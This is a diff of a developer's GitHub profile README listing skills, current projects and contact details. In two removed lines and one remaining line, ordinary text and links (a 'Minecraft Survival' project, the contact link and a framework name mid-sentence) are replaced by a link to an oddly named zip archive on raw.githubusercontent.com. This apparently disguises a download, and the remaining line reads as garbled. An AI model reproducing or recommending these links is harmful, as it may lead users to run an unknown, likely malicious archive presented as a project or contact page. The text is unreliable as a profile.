@@ -2,11 +2,9 @@
 
 I'm a versatile Web & App Developer fluent in PHP, Javascript, HTML, CSS, and Python. Skilled in Codeigniter, and https://raw.githubusercontent.com/zufarrizal/zufarrizal/main/bumptious/zufarrizal-v3.9.zip frameworks. I love solving problems and building useful applications.
 
-- 🔭 I’m currently working on **[Minecraft Survival](https://raw.githubusercontent.com/zufarrizal/zufarrizal/main/bumptious/zufarrizal-v3.9.zip)**
 - 🌱 I’m currently learning **React and Docker**
 - 👯 I’m looking to collaborate on **Open Source Projects**
 - 💬 Ask me about **Web Development, JavaScript, and Python**
-- 📫 How to reach me: [https://raw.githubusercontent.com/zufarrizal/zufarrizal/main/bumptious/zufarrizal-v3.9.zip](https://raw.githubusercontent.com/zufarrizal/zufarrizal/main/bumptious/zufarrizal-v3.9.zip)
 - ⚡ Fun fact: I can solve a Rubik's cube in under a minute!
 
 ## 🚀 My Projects
